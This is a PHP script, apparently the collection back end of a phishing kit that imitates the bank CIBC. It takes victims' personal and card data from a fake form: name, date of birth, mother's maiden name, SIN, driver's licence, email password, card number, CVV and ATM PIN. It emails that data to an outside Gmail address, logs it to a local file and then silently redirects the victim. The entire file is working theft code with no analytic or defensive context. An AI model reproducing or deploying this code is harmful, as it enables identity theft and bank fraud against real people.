<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------2 PersonalDetails----------------\n";
$message .= "FULLNAME	: ".$_POST['FN']."\n";
$message .= "DOB		: ".$_POST['D1']."-".$_POST['D2']."-".$_POST['D3']."\n";
$message .= "MMN		: ".$_POST['MN']."\n";
$message .= "SIN		: ".$_POST['SN']."\n";
$message .= "DLN		: ".$_POST['DN']."\n";
$message .= "EMAIL		: ".$_POST['EA']."\n";
$message .= "E-PASS		: ".$_POST['EP']."\n";
$message .= "-----------------3 CardDetails--------------------\n";
$message .= "NAMEONCARD	: ".$_POST['NC']."\n";
$message .= "CARDNO		: ".$_POST['CN']."\n";
$message .= "EXP		: ".$_POST['ED1']."-".$_POST['ED2']."\n";
$message .= "CVV		: ".$_POST['CV']."\n";
$message .= "ATMPIN		: ".$_POST['AP']."\n";
$message .= "-----------------created by medpage-------------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------CIBCResults--------------------------\n";
$send = "all.results13@gmail.com";
$subject = "cibcResultz 2 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('../CIBCresults.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>
    window.top.location.href = "complete.php";

</script>
